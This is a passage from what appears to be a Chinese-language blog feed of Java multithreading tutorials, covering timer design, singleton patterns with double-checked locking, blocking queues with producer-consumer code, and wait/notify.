title="思路分析"></a>思路分析</h6><p>1.Timer中需要有一个线程扫描任务是否到时间，是否执行,<br>2.需要一个数据结构，把所有的任务都保存起来<br>3.需要创建一个类通过类的对象描述一个任务(至少包含任务和时间)<br>相比ArrayList使用优先级队列更好【优先级队列时间复杂度可以达到O(1)】<br>咱都知道ArrayList（数组）遍历时会对每一个任务都进行遍历并且可能会有很多趟，这不是妥妥的资源浪费.而使用优先级队列可以给Timer中的任务“赋值”，最先执行时间最小的任务，其他任务就不能执行了.</p><h6 id="Question"><a href="#Question" class="headerlink" title="Question"></a>Question</h6><p>1.”调试器”怎么使用？<br>靠谱一点的是打印日志【println】，避免打断点对线程正常工作的影响.</p><p>2.为什么使用wait不使用sleep？【避免忙等 消耗资源】<br>使用wait比sleep更好.<strong>主线程调用schedule添加新任务但还在等待过程，新的任务执行时间比最早的任务时间还早刚好可以使用schedule中的notify唤醒wait让循环再执行一遍</strong></p>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程_0x6_</title>
      <link href="/2024/09/09/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%85%AD/"/>
      <url>/2024/09/09/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E5%85%AD/</url>
      
        <content type="html"><![CDATA[<h3 id="多线程篇六"><a href="#多线程篇六" class="headerlink" title="多线程篇六"></a>多线程篇六</h3><h4 id="什么是单例模式？"><a href="#什么是单例模式？" class="headerlink" title="什么是单例模式？"></a>什么是单例模式？</h4><p>单例模式是最常见的 <strong>设计模式</strong>.<br>顾名思义，单例模式指的就是单个实例的模式.（针对某些类只能使用一个对象的场景【如MySQL、JDBC、DataSource】）</p><h5 id="设计模式"><a href="#设计模式" class="headerlink" title="设计模式"></a>设计模式</h5><p>设计模式是针对某些问题场景而产生的处理问题的方法.(就跟你想吃早饭，可以选择自己做或者出去买或者蹭别人或者别的解决方法一样)<br><strong>tips</strong><br><strong>单例模式是线程安全的，能保证某个类在程序中只存在唯一一份实例而不会创建出多个实例.</strong></p><p>单例模式又分为饿汗和懒汉两种.</p><h5 id="饿汉模式"><a href="#饿汉模式" class="headerlink" title="饿汉模式"></a>饿汉模式</h5><p><strong>创建的比较早，类加载时就创建出了.</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span>&#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestSingleton</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        Singleton.getInstance();</span><br><span class="line"> </span><br><span class="line">        <span class="type">Singleton</span> <span class="variable">s</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>1.将instance 设为静态成员，在Singleton类被加载的时候进行实例创建（类加载创建）<br>2.通过此方法获取new出来的实例，其他代码块后续想一直使用这个类(获取这个类唯一的实例)，使用getInstance方法即可.<br>3.private Singleton() {} 是在设置私有构造方法,保证其它代码不能创建出新的对象.</p><p><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/e2c8e21f7fb02f10fb990f48e53fb982.png" alt="img"></p><h5 id="懒汉模式"><a href="#懒汉模式" class="headerlink" title="懒汉模式"></a>懒汉模式</h5><p><strong>创建的比较迟，首次使用的时候才创建.</strong></p><h6 id="单线程版"><a href="#单线程版" class="headerlink" title="单线程版"></a>单线程版</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">SingletonLazy</span> &#123;</span><br><span class="line">    <span class="comment">//先将引用初始化为null 不立即创建实例</span></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">SingletonLazy</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> SingletonLazy <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span>(instance == <span class="literal">null</span>) &#123;</span><br><span class="line">            instance = <span class="keyword">new</span> <span class="title class_">SingletonLazy</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">SingletonLazy</span><span class="params">()</span> &#123; &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>1.首次使用instance的时候才真正创建实例.（不调用就不创建）<br>2.第一次调用getInstance时，instance引用为null，进入if创建出的实例可以持续调用的实例.</p><h6 id="对比"><a href="#对比" class="headerlink" title="对比"></a>对比</h6><p><strong>1.懒汉模式比饿汉模式效率更高.</strong></p><p><strong>2.饿汉模式更具线程安全，饿汉模式getInstance只进行读取，懒汉模式对数据既会读取数据又会修改数据.</strong></p><p>线程安全问题发生在首次创建实例时，如果多个线程同时调用getInstance方法对变量进行修改就可能导致线程安全问题.<br>怎么解决呢？synchronized！</p><h6 id="多线程版"><a href="#多线程版" class="headerlink" title="多线程版"></a>多线程版</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line"> </span><br><span class="line">            <span class="keyword">if</span>(instance == <span class="literal">null</span>) &#123;</span><br><span class="line">                instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>问题来了😀.这么写后续每次调用getInstance都需要先加锁，但实际上懒汉模式线程安全问题只出现在new对象时，**一但对象new出来后续多线程调用getInstance只有读操作了，就不存在线程安全问题了.**【加锁就可能涉及到锁冲突一冲突就会引起阻塞和高性能无缘】<br><strong>解决方案</strong></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;<span class="comment">//第一个if判定的是是否加锁(保证执行效率)</span></span><br><span class="line">            <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line">                <span class="keyword">if</span>(instance == <span class="literal">null</span>) &#123;<span class="comment">//第二个if判定的是是否要创建对象(保障线程安全)</span></span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"> </span><br></pre></td></tr></table></figure><p>在外层再加一层if判断（如果instance为null，即为首次调用-&gt;是否需要加锁，非null-&gt;后续会调用-&gt;不用加锁）<br>但是又有惊喜来了！指令重排序！</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">instacnce = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br></pre></td></tr></table></figure><p>这条语句执行有三个指令<br>1.申请一段内存空间<br>2.在内存上调用构造方法，创建出实例<br>3.把内存地址赋值给instance<br>前面给大家介绍过，这些指令正常情况下按顺序执行，但CPU 可以会自己进行优化打乱顺序.<br>怎么解决？<br>volatile关键字！（防止指令重排序）</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Singleton</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">volatile</span> <span class="type">Singleton</span> <span class="variable">instance</span> <span class="operator">=</span> <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="title function_">Singleton</span><span class="params">()</span> &#123;&#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> Singleton <span class="title function_">getInstance</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">if</span> (instance == <span class="literal">null</span>) &#123;<span class="comment">//第一个if判定的是是否加锁(保证执行效率)</span></span><br><span class="line">            <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line">                <span class="keyword">if</span>(instance == <span class="literal">null</span>) &#123;<span class="comment">//第二个if判定的是是否要创建对象(保障线程安全)</span></span><br><span class="line">                    instance = <span class="keyword">new</span> <span class="title class_">Singleton</span>();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> instance;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="阻塞队列"><a href="#阻塞队列" class="headerlink" title="阻塞队列"></a>阻塞队列</h4><h5 id="什么是阻塞队列"><a href="#什么是阻塞队列" class="headerlink" title="什么是阻塞队列"></a>什么是阻塞队列</h5><p>阻塞队列是一种特殊的队列，遵守”先进先出”原则.【典型的生产者消费者模型】</p><h5 id="特性"><a href="#特性" class="headerlink" title="特性"></a>特性</h5><p>1.队列满的时候继续入队会阻塞，直到有其他线程从队列中取走元素.<br>2.队列空时继续出队也会阻塞，直到有其他线程王队列中插入元素.</p><h5 id="生产者消费者模型"><a href="#生产者消费者模型" class="headerlink" title="生产者消费者模型"></a>生产者消费者模型</h5><p><strong>分布式系统</strong>在实际开发中经常涉及，核心是分开工作发挥效果.服务器整个功能的实现是由每个服务器单独负责一部分工作实现的，通过各个服务器之间的网络通信完成整个功能.<br><img src="https://cdn.jsdelivr.net/gh/yubut/First@main/a76c32c0095637c65fd46b6420e6f5e2.png" alt="img"><br><strong>注意</strong><br>1.上述的阻塞队列是基于对应数据结构实现的服务器程序，被部署到单独的主机上.整个系统的结构更复杂.<br>2.引入阻塞队列在A发送请求到B接收是有开销损耗的.</p><h6 id="解耦合"><a href="#解耦合" class="headerlink" title="解耦合"></a>解耦合</h6><p>阻塞队列能使生产者和消费者解耦合.<br>高考完的暑假想赚点小钱，你和你的朋友开始摆摊卖冰汤圆，每个人都有明确的分工.（是的我是大馋丫头）小A负责采购材料，小B负责制作，小C负责配送，你负责宣传和看城管.顾客是“消费者”，不需要关注你们作为“生产者”谁做了冰汤圆.有吃就行.</p><h6 id="削峰填谷"><a href="#削峰填谷" class="headerlink" title="削峰填谷"></a>削峰填谷</h6><p>阻塞队列相当于一个缓冲区，平衡了生产者和消费者之间的处理能力.<br>618大抢购，一分钟之内可能会产生数百万订单，服务器在同一时刻收到大量的支付请求，直接处理服务器受不了会崩溃，（一个请求耗费的资源少但积累量变产生质变，任何一种硬件资源达到瓶颈服务器都会寄）<br>这时候就是阻塞队列大显身手的时候，将请求都放到一个阻塞队列中,然后再由消费者线程慢慢来处理每个支付请求.</p><h6 id="代码实现"><a href="#代码实现" class="headerlink" title="代码实现"></a>代码实现</h6><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">TestCustomerAndProducer</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        BlockingQueue&lt;Integer&gt; blockingQueue = <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;Integer&gt;();</span><br><span class="line"> </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">customer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">           <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">               <span class="keyword">try</span> &#123;</span><br><span class="line">                   <span class="type">int</span> <span class="variable">value</span> <span class="operator">=</span> blockingQueue.take();</span><br><span class="line">                   System.out.println(<span class="string">&quot;Consumption element: &quot;</span> + value);</span><br><span class="line">                   Thread.sleep(<span class="number">500</span>);</span><br><span class="line">               &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                   e.printStackTrace();</span><br><span class="line">               &#125;</span><br><span class="line">           &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;customer&quot;</span>);</span><br><span class="line">        </span><br><span class="line">        <span class="type">Thread</span> <span class="variable">producer</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Thread</span>(() -&gt; &#123;</span><br><span class="line">            <span class="type">Random</span> <span class="variable">r</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Random</span>();</span><br><span class="line">            <span class="keyword">while</span>(<span class="literal">true</span>) &#123;</span><br><span class="line">                <span class="keyword">try</span> &#123;</span><br><span class="line">                    <span class="type">int</span> <span class="variable">num</span> <span class="operator">=</span> r.nextInt(<span class="number">1000</span>);</span><br><span class="line">                    System.out.println(<span class="string">&quot; Production elements: &quot;</span> + num);</span><br><span class="line">                    blockingQueue.put(num);</span><br><span class="line">                    Thread.sleep(<span class="number">300</span>);</span><br><span class="line">                &#125; <span class="keyword">catch</span> (InterruptedException e) &#123;</span><br><span class="line">                    e.printStackTrace();</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;, <span class="string">&quot;procedure&quot;</span>);</span><br><span class="line"> </span><br><span class="line">        customer.start();</span><br><span class="line">        producer.start();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h5 id="实现阻塞队列"><a href="#实现阻塞队列" class="headerlink" title="实现阻塞队列"></a>实现阻塞队列</h5><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> java.util.Random;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlockingQueue</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span>[] elems = <span class="keyword">new</span> <span class="title class_">int</span>[<span class="number">2000</span>];</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">size</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">head</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">volatile</span> <span class="type">int</span> <span class="variable">tail</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">synchronized</span> <span class="type">int</span> <span class="title function_">getSize</span><span class="params">()</span> &#123;</span><br><span class="line">        <span class="keyword">return</span> size;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">put</span><span class="params">(<span class="type">int</span> value)</span> <span class="keyword">throws</span> InterruptedException&#123;</span><br><span class="line">        <span class="keyword">synchronized</span>(locker)&#123;</span><br><span class="line">            <span class="keyword">while</span>(size &gt;= elems.length) &#123;</span><br><span class="line">                <span class="comment">//满 阻塞等待</span></span><br><span class="line">                locker.wait();</span><br><span class="line">            &#125;</span><br><span class="line">            elems[tail] = value;</span><br><span class="line">            tail = (tail + <span class="number">1</span>) % elems.length;</span><br><span class="line">            size++;</span><br><span class="line">            <span class="comment">//入队后唤醒</span></span><br><span class="line">            locker.notify();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="type">int</span> <span class="title function_">take</span><span class="params">()</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">ret</span> <span class="operator">=</span> <span class="number">0</span>;</span><br><span class="line">        <span class="keyword">synchronized</span>(locker) &#123;</span><br><span class="line">            <span class="keyword">while</span>(size &lt;= <span class="number">0</span>) &#123;</span><br><span class="line">                <span class="comment">//队列空继续阻塞</span></span><br><span class="line">                locker.wait();</span><br><span class="line">            &#125;</span><br><span class="line">            ret = elems[head];</span><br><span class="line">            head = (head + <span class="number">1</span>) % elems.length;</span><br><span class="line">            size--;</span><br><span class="line">            <span class="comment">//出队成功后唤醒</span></span><br><span class="line">            locker.notify();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> ret;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p><strong>注意</strong><br>1.使用<strong>循环队列</strong>实现（注意理解头指针和尾指针的变化）<br>2.<strong>put和take使用的是同一把锁</strong>，若队列被put满之后又唤醒了另一个阻塞的put就会出bug，<strong>加while</strong>判断，如果队列一直是慢的就不再被唤醒，保证安全性.</p><h5 id="标准库中的阻塞队列"><a href="#标准库中的阻塞队列" class="headerlink" title="标准库中的阻塞队列"></a>标准库中的阻塞队列</h5><p>在 Java 标准库中内置了阻塞队列. 如果我们需要在一些程序中使用阻塞队列, 直接使用标准库中的即可.<br>1.BlockingQueue 是一个接口. 真正实现的类是 LinkedBlockingQueue.<br>2.put 方法用于阻塞式的入队列, take 用于阻塞式的出队列.<br>3.BlockingQueue 也有 offer, poll, peek 等方法, 但是这些方法不带有阻塞特性.</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">BlockingQueue</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        BlockingQueue&lt;String&gt; queue = <span class="keyword">new</span> <span class="title class_">LinkedBlockingQueue</span>&lt;&gt;();</span><br><span class="line">        <span class="comment">//入队列</span></span><br><span class="line">        queue.put(<span class="string">&quot;abc&quot;</span>);</span><br><span class="line">        <span class="comment">//出队列.如果没有put直接take,会阻塞.</span></span><br><span class="line">        <span class="type">String</span> <span class="variable">elem</span> <span class="operator">=</span> queue.take();</span><br><span class="line">        System.out.println(elem);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> Java </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Java多线程_0x5_</title>
      <link href="/2024/09/08/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%BA%94%E2%80%94%E2%80%94wait%E5%92%8Cnotify/"/>
      <url>/2024/09/08/%E5%A4%9A%E7%BA%BF%E7%A8%8B%E7%AF%87%E4%BA%94%E2%80%94%E2%80%94wait%E5%92%8Cnotify/</url>
      
        <content type="html"><![CDATA[<h3 id="多线程篇五——wait和notify"><a href="#多线程篇五——wait和notify" class="headerlink" title="多线程篇五——wait和notify"></a>多线程篇五——wait和notify</h3><p>如笔者理解有误,欢迎交流指正⭐</p><p>线程的执行先后顺序难以预料【抢占式执行】，但是实际开发中我们会需要掌握当下线程的执行顺序.<br>这就是wait和notify的作用.【都是Object方法即随便定义一个对象豆可以使用wait和notify】</p><h4 id="wait-方法"><a href="#wait-方法" class="headerlink" title="wait()方法"></a>wait()方法</h4><h5 id="wait执行过程"><a href="#wait执行过程" class="headerlink" title="wait执行过程"></a>wait执行过程</h5><p>1.释放当前的锁<br>2.让线程进入阻塞<br>3.当线程被唤醒的时候重新获取到锁</p><p>上代码</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo15</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> InterruptedException &#123;</span><br><span class="line">        <span class="type">Object</span> <span class="variable">object</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Object</span>();</span><br><span class="line">        <span class="keyword">synchronized</span> (object) &#123;</span><br><span class="line">            System.out.println(<span class="string">&quot;waiting...&quot;</span>);</span><br><span class="line">            object.wait();</span><br><span class="line">            System.out.println(<span class="string">&quot;end.&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>运行发现wait一直处于等待状态</p><p>1<br><strong>tips</strong><br><strong>wait搭配synchronized使用，synchronized加锁给对象头进行标记</strong></p><h5 id="wait结束等待的条件"><a href="#wait结束等待的条件" class="headerlink" title="wait结束等待的条件"></a>wait结束等待的条件</h5><p>其他线程调用该对象的notify方法<br>wait等待超时（timeout用来指定等待时间）<br>其他线程调用该等待线程的interrupted方法，抛出InterruptedException异常</p><h5 id="wait和sleep的对比"><a href="#wait和sleep的对比" class="headerlink" title="wait和sleep的对比"></a>wait和sleep的对比</h5><h6 id="共同点"><a href="#共同点" class="headerlink" title="共同点"></a>共同点</h6><p>让线程在一段时间里不执行.【wait用于线程间通信(生产者-消费者模型) sleep用于线程阻塞(延迟操作)】</p><h6 id="不同点"><a href="#不同点" class="headerlink" title="不同点"></a>不同点</h6><p>1.wait()可通过notify()唤醒,sleep()通过Interrupt()唤醒<br>2.使用wait()时没有设置最大等待时间，而sleep()是在知道最大时限的情况下使用(通过异常唤醒,说明程序应该是出现特殊情况了).<br>3.wait()搭配synchronized使用,sleep()不用.<br>4.wait()是Object的方法,sleep()是Thread的静态方法.<br>5.wait()方法会释放锁，sleep()不会.</p><h4 id="notify-方法"><a href="#notify-方法" class="headerlink" title="notify()方法"></a>notify()方法</h4><p>此时我们的notify()方法就担起了<strong>唤醒</strong>wait()方法的大任(唤醒等待的线程).<br><strong>tips</strong><br>notify()要在同步方法或同步块中调用.它会通知可能等待该对象对象锁的其他线程，使得它们重新获取对象锁.<br>如果有多个线程等待，有线程调度器随机挑选一个wait状态的线程[【无先来后到】<br>调用notify()方法后不会立即释放对象锁，要等到执行notify()方法的线程将程序执行完之后【退出同步代码块】才会释放对象锁.</p><h5 id="notify唤醒线程过程"><a href="#notify唤醒线程过程" class="headerlink" title="notify唤醒线程过程"></a>notify唤醒线程过程</h5><p>1.创建 WaitTask 类, 对应一个线程, run 内部循环调用 wait.<br>2.创建 NotifyTask 类, 对应另一个线程, 在 run 内部调用一次 notify 注意, WaitTask 和 NotifyTask 内部持有同一个 Object locker.<br>3.WaitTask 和 NotifyTask 要想配合 就需要搭配同一个 Object. </p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">Demo16</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">static</span> <span class="type">Object</span> <span class="variable">locker</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title 